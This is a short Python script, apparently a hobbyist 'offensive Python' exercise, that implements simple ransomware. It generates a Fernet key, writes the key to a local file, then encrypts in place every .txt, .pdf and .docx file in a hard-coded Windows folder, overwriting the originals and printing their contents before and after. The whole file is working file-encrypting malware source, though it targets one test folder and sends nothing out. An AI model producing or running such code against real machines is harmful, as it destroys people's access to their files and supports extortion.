from cryptography.fernet import Fernet
import os
from pathlib import Path

class Ransom:
    def __init__(self):
        self._key = ''
        self._dir = Path(r'C:\Users\Fernando\Documents\offensivePython\simple_ransomware\pwned')
        self._ext = ('.txt', '.pdf', '.docx')

    def genKey(self):
        self._key = Fernet.generate_key()
        self._key = newRansom._key = str(self._key).split("'")[1]

    @property
    def key(self, key):
        self._key = key

    @key.getter
    def key(self):
        return self._key

    def save_key(self):
        key_path = Path(r'C:\Users\Fernando\Documents\offensivePython\simple_ransomware')
        file = open(f'{key_path}/key.txt', 'w')
        file.write(self._key)

    def crypto(self):
        for arquivo in os.listdir(self._dir):
            if arquivo.endswith(self._ext):
                caminho = (f"{self._dir}/{arquivo}")
                print(f"Path> {caminho}")

                x = open(caminho, 'rb')
                dados = x.read()
                print(f"Sem crypto> {dados}")
                x.close()

                key = Fernet(self._key)
                dado_crypto = key.encrypt(dados)
                print(f"Com crypto> {dado_crypto}")

                file = open(caminho, 'wb')
                file.write(dado_crypto)
                file.close()

if __name__ == '__main__':
    newRansom = Ransom()
    newRansom.genKey()
    print(f"Chave de criptografia> {newRansom.key}")
    newRansom.save_key()

    newRansom.crypto()
